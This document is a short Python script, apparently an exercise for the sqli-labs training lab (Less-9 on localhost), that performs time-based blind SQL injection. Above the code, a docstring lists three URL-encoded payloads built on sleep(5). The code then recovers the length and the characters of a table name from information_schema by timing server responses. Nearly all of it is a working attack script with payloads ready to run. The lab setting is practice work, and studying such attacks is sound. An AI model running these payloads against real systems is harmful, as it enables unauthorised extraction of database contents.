'''
http://127.0.0.1/1/Less-9/?id=1%27%20and%20if(left(version(),1)=4,1,sleep(5))%23
http://127.0.0.1/1/Less-9/?id=1%27%20and%20if(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27security%27%20limit%200,1),1,1))=101,1,sleep(5))%23
http://127.0.0.1/1/Less-9/?id=1%27%20and%20if((select%20length(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1)=6,1,sleep(5))%23
'''
import requests
import time

url = 'http://127.0.0.1/1/Less-9/?id=1'


def sqlin(sql,i):
    t1 = time.time()
    r = requests.get(sql)
    t2 = time.time()
    if t2-t1>5:
        return i
    else:
        print(sql)

def get_leng():
    for i in range(1,50):
        payload = '\' and if((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)={0},sleep(5),1)%23'.format(i)
        leng = sqlin(url+payload,i)
        if leng:
            return i


def get_data(loca):
    for i in range(65,123):
        payload = '\' and if(ascii(substr((select table_name from information_schema.tables where table_schema=%27security%27 limit 0,1),{0},1))={1},sleep(5),1)%23'.format(loca,i)
        data = sqlin(url+payload,i)
        if data:
            return chr(i)
            print(chr(i))



if __name__ == '__main__':
    data = ''
    length = get_leng()
    print(length)
    for i in range(1,length):
        data += get_data(i)
        print(data)
